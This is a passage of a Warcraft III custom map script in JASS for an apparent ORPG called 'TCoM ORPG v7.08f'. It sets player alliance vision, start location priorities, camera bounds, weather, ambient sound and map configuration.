call SetPlayerAllianceStateVisionBJ(Player(4),Player(6),true)
call SetPlayerAllianceStateVisionBJ(Player(4),Player(7),true)
call SetPlayerAllianceStateVisionBJ(Player(4),Player(8),true)
call SetPlayerAllianceStateVisionBJ(Player(5),Player(0),true)
call SetPlayerAllianceStateVisionBJ(Player(5),Player(1),true)
call SetPlayerAllianceStateVisionBJ(Player(5),Player(2),true)
call SetPlayerAllianceStateVisionBJ(Player(5),Player(3),true)
call SetPlayerAllianceStateVisionBJ(Player(5),Player(4),true)
call SetPlayerAllianceStateVisionBJ(Player(5),Player(6),true)
call SetPlayerAllianceStateVisionBJ(Player(5),Player(7),true)
call SetPlayerAllianceStateVisionBJ(Player(5),Player(8),true)
call SetPlayerAllianceStateVisionBJ(Player(6),Player(0),true)
call SetPlayerAllianceStateVisionBJ(Player(6),Player(1),true)
call SetPlayerAllianceStateVisionBJ(Player(6),Player(2),true)
call SetPlayerAllianceStateVisionBJ(Player(6),Player(3),true)
call SetPlayerAllianceStateVisionBJ(Player(6),Player(4),true)
call SetPlayerAllianceStateVisionBJ(Player(6),Player(5),true)
call SetPlayerAllianceStateVisionBJ(Player(6),Player(7),true)
call SetPlayerAllianceStateVisionBJ(Player(6),Player(8),true)
call SetPlayerAllianceStateVisionBJ(Player(7),Player(0),true)
call SetPlayerAllianceStateVisionBJ(Player(7),Player(1),true)
call SetPlayerAllianceStateVisionBJ(Player(7),Player(2),true)
call SetPlayerAllianceStateVisionBJ(Player(7),Player(3),true)
call SetPlayerAllianceStateVisionBJ(Player(7),Player(4),true)
call SetPlayerAllianceStateVisionBJ(Player(7),Player(5),true)
call SetPlayerAllianceStateVisionBJ(Player(7),Player(6),true)
call SetPlayerAllianceStateVisionBJ(Player(7),Player(8),true)
call SetPlayerAllianceStateVisionBJ(Player(8),Player(0),true)
call SetPlayerAllianceStateVisionBJ(Player(8),Player(1),true)
call SetPlayerAllianceStateVisionBJ(Player(8),Player(2),true)
call SetPlayerAllianceStateVisionBJ(Player(8),Player(3),true)
call SetPlayerAllianceStateVisionBJ(Player(8),Player(4),true)
call SetPlayerAllianceStateVisionBJ(Player(8),Player(5),true)
call SetPlayerAllianceStateVisionBJ(Player(8),Player(6),true)
call SetPlayerAllianceStateVisionBJ(Player(8),Player(7),true)
call SetPlayerTeam(Player(9),1)
endfunction
function B8D takes nothing returns nothing
call SetStartLocPrioCount(0,7)
call SetStartLocPrio(0,0,1,MAP_LOC_PRIO_HIGH)
call SetStartLocPrio(0,1,2,MAP_LOC_PRIO_HIGH)
call SetStartLocPrio(0,2,3,MAP_LOC_PRIO_HIGH)
call SetStartLocPrio(0,3,4,MAP_LOC_PRIO_HIGH)
call SetStartLocPrio(0,4,5,MAP_LOC_PRIO_HIGH)
call SetStartLocPrio(0,5,6,MAP_LOC_PRIO_HIGH)
call SetStartLocPrio(0,6,8,MAP_LOC_PRIO_HIGH)
call SetStartLocPrioCount(1,5)
call SetStartLocPrio(1,0,0,MAP_LOC_PRIO_HIGH)
call SetStartLocPrio(1,1,2,MAP_LOC_PRIO_HIGH)
call SetStartLocPrio(1,2,3,MAP_LOC_PRIO_HIGH)
call SetStartLocPrio(1,3,4,MAP_LOC_PRIO_HIGH)
call SetStartLocPrio(1,4,5,MAP_LOC_PRIO_HIGH)
call SetStartLocPrioCount(2,5)
call SetStartLocPrio(2,0,0,MAP_LOC_PRIO_HIGH)
call SetStartLocPrio(2,1,1,MAP_LOC_PRIO_HIGH)
call SetStartLocPrio(2,2,3,MAP_LOC_PRIO_HIGH)
call SetStartLocPrio(2,3,4,MAP_LOC_PRIO_HIGH)
call SetStartLocPrio(2,4,5,MAP_LOC_PRIO_HIGH)
call SetStartLocPrioCount(3,5)
call SetStartLocPrio(3,0,0,MAP_LOC_PRIO_HIGH)
call SetStartLocPrio(3,1,1,MAP_LOC_PRIO_HIGH)
call SetStartLocPrio(3,2,2,MAP_LOC_PRIO_HIGH)
call SetStartLocPrio(3,3,4,MAP_LOC_PRIO_HIGH)
call SetStartLocPrio(3,4,5,MAP_LOC_PRIO_HIGH)
call SetStartLocPrioCount(4,5)
call SetStartLocPrio(4,0,0,MAP_LOC_PRIO_HIGH)
call SetStartLocPrio(4,1,1,MAP_LOC_PRIO_HIGH)
call SetStartLocPrio(4,2,2,MAP_LOC_PRIO_HIGH)
call SetStartLocPrio(4,3,3,MAP_LOC_PRIO_HIGH)
call SetStartLocPrio(4,4,5,MAP_LOC_PRIO_HIGH)
call SetStartLocPrioCount(5,5)
call SetStartLocPrio(5,0,0,MAP_LOC_PRIO_HIGH)
call SetStartLocPrio(5,1,1,MAP_LOC_PRIO_HIGH)
call SetStartLocPrio(5,2,2,MAP_LOC_PRIO_HIGH)
call SetStartLocPrio(5,3,3,MAP_LOC_PRIO_HIGH)
call SetStartLocPrio(5,4,4,MAP_LOC_PRIO_HIGH)
call SetStartLocPrioCount(6,7)
call SetStartLocPrio(6,0,0,MAP_LOC_PRIO_HIGH)
call SetStartLocPrio(6,1,1,MAP_LOC_PRIO_HIGH)
call SetStartLocPrio(6,2,2,MAP_LOC_PRIO_HIGH)
call SetStartLocPrio(6,3,3,MAP_LOC_PRIO_HIGH)
call SetStartLocPrio(6,4,4,MAP_LOC_PRIO_HIGH)
call SetStartLocPrio(6,5,5,MAP_LOC_PRIO_HIGH)
call SetStartLocPrio(6,6,7,MAP_LOC_PRIO_HIGH)
call SetStartLocPrioCount(7,2)
call SetStartLocPrio(7,0,6,MAP_LOC_PRIO_HIGH)
call SetStartLocPrio(7,1,8,MAP_LOC_PRIO_HIGH)
call SetStartLocPrioCount(8,1)
call SetStartLocPrio(8,0,7,MAP_LOC_PRIO_HIGH)
endfunction
function main takes nothing returns nothing
local weathereffect B
call SetCameraBounds(-16384.+GetCameraMargin(CAMERA_MARGIN_LEFT),-24576.+GetCameraMargin(CAMERA_MARGIN_BOTTOM),24576.-GetCameraMargin(CAMERA_MARGIN_RIGHT),16000.-GetCameraMargin(CAMERA_MARGIN_TOP),-16384.+GetCameraMargin(CAMERA_MARGIN_LEFT),16000.-GetCameraMargin(CAMERA_MARGIN_TOP),24576.-GetCameraMargin(CAMERA_MARGIN_RIGHT),-24576.+GetCameraMargin(CAMERA_MARGIN_BOTTOM))
call SetDayNightModels("Environment\\DNC\\DNCAshenvale\\DNCAshenvaleTerrain\\DNCAshenvaleTerrain.mdl","Environment\\DNC\\DNCAshenvale\\DNCAshenvaleUnit\\DNCAshenvaleUnit.mdl")
set B=AddWeatherEffect(Rect(-16384.,-24576.,24576.,16384.),$534E6C73)
call EnableWeatherEffect(B,true)
call NewSoundEnvironment("Dungeon")
call SetAmbientDaySound("VillageDay")
call SetAmbientNightSound("VillageNight")
call SetMapMusic("Music",true,0)
call mW()
call mt()
call mu()
call mX()
call mY()
call ms()
call InitBlizzard()
call ExecuteFunc("B8E")
call ExecuteFunc("jU")
call ExecuteFunc("jg")
call ExecuteFunc("ji")
call ExecuteFunc("jj")
call ExecuteFunc("jw")
call ExecuteFunc("j6")
call ExecuteFunc("kE")
call ExecuteFunc("kL")
call ExecuteFunc("lY")
call ExecuteFunc("lx")
call nb()
call no()
call wL()
call BwK()
call ly()
call B78()
call B79()
set B=null
endfunction
function config takes nothing returns nothing
call SetMapName("|cFF69ff69 [SHDR] TCoM ORPG |c006969ffv7.08f")
call SetMapDescription("|c00ffff00I-IntegraL|r presents
")
call SetPlayers(10)
call SetTeams(10)
call SetGamePlacement(MAP_PLACEMENT_TEAMS_TOGETHER)
call DefineStartLocation(0,-15616.,14528.)
call DefineStartLocation(1,-15616.,14592.)
call DefineStartLocation(2,-15616.,14528.)
call DefineStartLocation(3,-15616.,14592.)
call DefineStartLocation(4,-15616.,14528.)
call DefineStartLocation(5,-15616.,14528.)
call DefineStartLocation(6,-15616.,14592.)
call DefineStartLocation(7,-15616.,14528.)
call DefineStartLocation(8,-768.,-23680.)
call DefineStartLocation(9,19328.,14656.)
call B8B()
call B8C()
call B8D()
endfunction
function B8E takes nothing returns nothing
endfunction
